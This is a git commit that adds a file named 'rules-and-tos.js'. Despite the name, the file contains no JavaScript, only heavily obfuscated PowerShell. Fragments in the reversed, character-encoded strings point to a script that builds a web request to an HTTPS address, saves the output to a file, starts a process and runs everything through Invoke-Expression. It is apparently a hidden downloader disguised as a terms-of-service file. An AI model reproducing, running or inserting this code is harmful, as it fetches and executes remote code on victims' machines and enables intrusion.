2daadb152cb1f3f85da09acb35114f94bbe47396
Azkic50 <Azkilohj55@gmail.com>
2025-04-16 07:50:06 -0400

    Create rules-and-tos.js

---
+++ rules-and-tos.js
@@ -0,0 +1,22 @@
+SV  ('xl'+'w5A') ([ChAr[] ] "))63]rAhc[,'CbR' ecAlPerc-93]rAhc[,'rsS'  ecAlpEr-43]rAhc[,'zTL'ecAlpEr- )' ) )93]rahc[]gniRTS[,)301]rah'+'c[+911]rahc['+'+68]rahc[((ECAlper.)rsSCbRrsS,rsSSJQrsS(ECA'+'lper.)421]rahc[]gniRTS[,)68]rahc[+601]rah'+'c[+47]rahc[((ECAlper.)69]rahc[]gniRTS[,rsSGeTrsS(ECAlper.))rsSV+gwVrsS,rsSgwV+gwVrof  
+'+';gwV+gwV)
+})gwV+g'+'wVCxb.RJgwV+gwVXZgwV+gwVRgwV+gwVCxb'+',CxgwV+gwVbismCxrsS,rsSVdgwV+gwV{gwV+gwVVxM        
+gwV+'+'gwV{gwV+gwV gwV+gwV)gwV+gwV}hTaPeLgwV+gwVi2fSgwV+gwVF{VxMgwV+gwV'+' )gwV+gwVCxb-tseTCxb,CgwV+gwVxbtgwV+gwVaPCxgwV+gwVb,CxbgwV+gwVhCxgwV+gwVb gwrsS,rsSdiLlEhSSJQ ( . VjJ )gwVGe'+'TgwV,)05]rahc[+201]rahc[+38]rahc[((eCAlPer.)93]rahc[]GNiRts[,gwVCxbg'+'wV(e'+'CAlP'+'er.)4'+'3'+']rahc'+'[]GNiRts[,)89]rahc[+001]rahc'+'[+221]rsS,rsSb,gwrsS,rsSbdz)b.gwV+gwViVgwV+gwVxM(VgwV+gwVxMkDuPMETgwV+gwV:gwV'+'+gwVvnegwVrsS,rsSxbrsS,rsSCxb,rsS,rsSCxbIZCxb,CxgwV+gwVbRrsS,rsS8{}5{}4{}11gwV+gwV{gwV+gwV}7{}'+'3{}gw'+'V+gwV6gwV+gwV{'+'rsS,rsSgwV'+'+gwVCgwV+g'+'wVxb f-rsS,rsSMbdz = }hTApELI2gwV+gwVfSF{V'+'xgwV+gwVM gwV+gwV gwV+gwV  gwV+gwV  
+{g'+'wV+gwVrsS,'+'rs'+'SV+gwVfgwV+'+'gwV- bgwVrsS,rsSVCxb,CgwV+gwVxb.Cxb,CrsS,'+'rsSwV fi gwV+gwV  grsS,rsSwV+gwVfgwV+gwV{V'+'gwV+g'+'wVrsS,rsSwrsS'+',rsSV }I{Vxg'+'wV+gwVM( hcagwV+gwVersS,rsS}2gwV+gwV{}0{bdzgwV+gwV(&  gw'+'V+rsS,rsSxgwV+rsS,rsSwVxgwV+gwVb,gwV+gwVCxgwV+g'+'wVbRrsS,rsSgwV+gwV}01gwV+g'+'wV{gwV+gwV}2{}gwV+gwV0{}9gwV+gwV{gwV+gwVbdzgwV+gwV( = gwV+gwV)C'+'xbagwV+gw'+'VCgwV+gwVxb({@]tc'+'egwV+gwVjbOmogwV+gwVtsgwV+gwVugwV+gwVCSP[ gwV+gwV 
+(@ = }AgwV+gwVtA2gwV+gwVfSDEMO2fgwV+gwVSS{VxMrsS,rsSwV}gwV+'+'gwVegwV+gwVugwV+gwVR2fgwV+gwVSt{VgwV+gwVxM =gwV+gwV }gw'+'V+gwVda'+'ogwV+gwVL'+'2gwV+gwVfSNwo2f'+'Sd{gwV+gwVVx'+'M   rs'+'S,rs'+'S gwV+gwVyrrsS,rs'+'S)gwVxgwV+]31'+'[diLleh'+'sSJQ+rsS,r'+'sSlgwV+gwVexigwV+gwVpgwV+gwVCxgwV+gwVb,gwV+gwVCxbttgwV+gwVhCxbgwV+gwV,CgwV+'+'gwVxbR'+'JXZR'+'RgwV+gwVIZ/gwV'+'+gwrsS,'+'rsS}gwV+gwV2{'+'}3gwV+gwV{}4{gwV+gwVbdz(.        
+{ )}gwV+gwVdaOLgwV+gwVnw2fSgwV+gwVO2rsS,rsSgwV+gwV  
+gwV+gwV
+gwV('+' r'+'sS,rsSgwVxgwV+gwVb,Cxg'+'wV+gwVb/gwV+gwVCxb,CrsS,rsSwVLA2fSF{gwV+gwVVgwV+gwVxM = }dAOgwV+gwVlNgwV+gwV2fSgwV+gwVwogwV+gwV2fSgwV+g'+'rsS,rsS]1[rsS,rsS bdzgwV+gwV}gw'+'V+gwV2{}gwV+gwV3gwV+gwV{}rsS,rsSCxbuqrsS,rsSVbgwV+gwV,CxbdCxgwV'+'+gwVb,gwV+gwVCgwV+gw'+'VxbfgwV+gwVCxb,gwV+gwVCxbsregwV+gwVCgwV+rsS,rsSCxb,CxbdohteMgrsS,rsSxgwV+gwV'+'btseCxgwV+gwrsS,rsSgwVkDugwV(eCAlPer.)gwV  
+
+} gwV+gwV 
+}gwV+gwV  gwV+gwV gwV+gwV gwV+gwV
+{gwV+'+'gwV hctac  gw'+'V+gwV  
+}gwV+gwV    
+gwV+gwVrsS,rsS+gwVVxgwV+gwVrsS,rsS  gwV+gwV 
+;gwV+gwVrsS,rsS+gwVdgwV+gwVz}0gwV+gwV{}gwV+gwV1{gwV+gwV}2'+'{bgwV+gwVdz(gwV+gwV&rsS,rsSwV+gwVtsgwV+gwVeCxbfgwV+'+'gwV-bdz}0gwV+gwV{}1{rsS,rsSwV+gwV  gwV+gwV 
+ }gwV+gwV   gwV+gwV   
+;gwV+g'+'wV}es2fSgwV+grsS,rsS;}gwV+gwVhtgwV+gwVagwV+gwVpgwV+gwV2'+'fSelI2gwV+gwVfSfgw'+'V+gwV{VxMgwV+gwV )'+'CxbrCgwV+gwVxb,gwV+gwVCgwV+gwVxbssecorP-gwV+gwVtCxb,gwV'+'+gwVCxbgwV+g'+'wVatSCxbf-bdz}1{gwV+gwVrsS,rsSV gwV+gwV'+'  gwV+gwV gwrsS,rsS'+'t  gwV+gwV  gwV'+'+gwV
+{ )}At'+'AgwV+gw'+'V2gwV+gwVfSgwV+gwVdemogwV+gwV2fSgwV+gwVs{V'+'xM nigwV+gwrsS,rsSgwV+gwVfSD'+'{V'+'xM(gwV+grsS,rsSigwV+gwVsm'+'.CgwV+gwVxb,Cxb/:spgw'+'V+gwVC'+'xb gwVrsS,rsS( gwrsS,rsSV+gwV
+}    gwV+gwV  
+ ;}gwV+gwVhtA2fSPeL2fgwV+gwVSgwV+gwVIgrsS,rsS)63]rahc[]GNiRts[,)68]rahc[+021]rahc[+77]rahc[((eCAlP'+'er.)29]rahc[]GNiRts[,rsS,rsS+gwVfgwV+gwV- gwV+gwVbgwV+gwVdzgwV+gwV}'+'1gwV+gwV{}gwV+gwVrsS,rsSgwVM eligwV+'+'gwVFtuOgwV+gwV-gwV+gwV bdzAbdz.}I{VgwV+gwVxM irU- gwV+gwV)gwV+gwVCxbog'+'wV+gwVvngwV+gwVIgwV+gwVCxbgw'+'V+gwV,CxbgwV+gwVkC'+'xbgwV+gwV,Cxgw'+'V+gwVb-gwV+gwVeCgwV+grsS,rsSgwrsS,rsSV+gwVfi    gwV+gwV  
+;'+'gwV+gr'+'sS,rsSgwV'+'+gwV0{}1{gwV+gwVbdgwV+gwVz( =gwV+gwV gwV+gwV)CxbbCgwV+gwVxb( ;)CxbgwV+gwVcrsS,r'+'sSrahc[((eCAlPer.rsSf-zTL}1'+'3'+'{}5'+'2{}25{}0{}6{}91{}'+'31{}73{}3{}21{}7{}'+'04{}63{}4{}53{}12{'+'}'+'51{}'+'92{}0'+'1{}14{}41{}62{}93{}35{}34{}61{}8{}2{}33{}71{}05{}81{}44{}23{}11{}83{}45{}15{}55{}74{}54{}42{}1{}84{}32{}03{}24{}02{}22{}72{}94{}9{}5{}64{}43{}8'+'2{zTL(((noiSsERpxE-eKovNi '((( )'X'+]43[emOHSP$+]4[EmOhsP$ (." );[array]::reVerSe( (  GEt-VarIaBle ('XL'+'w5A')  ).Value) ; & ( $eNV:comSPeC[4,15,25]-jOin'') ( " $( $oFs = '')"+ [STRInG] ( (  GEt-VarIaBle ('XL'+'w5A')  ).Value ) +"$( set-Item  'VAriABLe:OFs'  ' ' )" )
